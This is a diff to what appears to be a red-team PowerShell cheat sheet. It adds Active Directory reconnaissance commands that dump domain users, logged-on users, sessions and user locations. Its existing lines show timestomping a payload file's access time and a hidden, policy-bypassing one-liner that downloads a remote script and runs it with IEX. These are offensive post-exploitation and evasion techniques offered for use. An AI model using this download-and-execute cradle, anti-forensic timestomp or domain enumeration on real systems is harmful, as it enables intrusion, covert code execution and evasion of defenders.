@@ -12,6 +12,42 @@
 
 ```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt ").LastAccessTime=("01 March 2019 19:00:00")```
 
+## Enumerating Domain Users with PowerShell:
+
+
+Save all Domain Users to a file
+
+```
+Get‐DomainUser | Out‐File ‐FilePath .\DomainUsers.txt
+```
+
+Will return specific properties of a specific user
+
+```
+Get‐DomainUser ‐Identity [username] ‐Properties DisplayName, MemberOf |
+Format‐List
+```
+
+Enumerate user logged on a machine
+
+```
+Get‐NetLoggedon ‐ComputerName <ComputerName>
+```
+
+Enumerate Session Information for a machine
+
+```
+Get‐NetSession ‐ComputerName <ComputerName>
+```
+
+Enumerate domain machines of the current/specified domain where specific
+users are logged in
+
+```
+Find‐DomainUserLocation ‐Domain <DomainName> | Select‐Object UserName,
+SessionFromName
+```
+
 ## Sneaky PowerShell Commands:
 
 ```powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"```
